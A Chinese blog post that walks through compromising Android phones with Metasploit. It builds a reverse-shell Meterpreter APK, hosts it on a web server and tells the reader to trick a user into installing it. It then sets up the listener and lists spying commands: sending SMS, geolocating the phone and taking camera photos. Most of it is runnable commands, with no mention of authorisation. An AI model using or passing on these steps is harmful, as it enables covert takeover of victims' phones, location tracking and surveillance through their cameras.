---
layout: post
category: binghe-code-hack
title: 使用Metasploit渗透Android系统
tagline: by 冰河
tag: [hack,binghe-code-hack]
excerpt: 使用Metasploit渗透Android系统
lock: need
---

# 使用Metasploit渗透Android系统

可以创建一个新的APK文件，也可以将攻击载荷注入到一个现有的APK文件来攻击Android平台，这里我们使用第一种方法。

## 创建APK文件 

```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.175.128 LPORT=4444 R > /var/www/html/test.apk
```

## 启动Apache服务

```bash
service apache2 start
```

## 诱导用户下载安装APK

这一步，我们诱导用户下载并安装这个APK文件。

## 实施攻击

```bash
msfconsole
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST 192.168.175.128
set LPORT 4444
exploit
```

到此，只要用户下载安装了我们的test.apk文件，我们就会获取到Meterpreter权限。

## 后渗透测试

在我们获取了目标Android手机的Meterpreter权限之后，我们可以执行如下命令进行后渗透攻击

**注意：如下命令都是在meterpreter命令行下执行的。**

## 查看手机是否root过

```bash
check_root
```

## 发送短信

```bash
send_sms -d 某个手机号码 -t "hello"
```

## 查看系统信息

```bash
sysinfo
```

## 对手机进行定位

```bash
wlan_geolocate
```

此命令会输出手机的经纬度，我们根据这个经纬度就可以知道手机的具体位置。

## 使用手机摄像头拍照

```bash
webcam_snap
```


## 写在最后

> 如果你觉得冰河写的还不错，请微信搜索并关注「 **冰河技术** 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 **冰河技术** 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 **冰河技术** 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 **冰河技术** 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！


![](https://img-blog.csdnimg.cn/20200906013715889.png)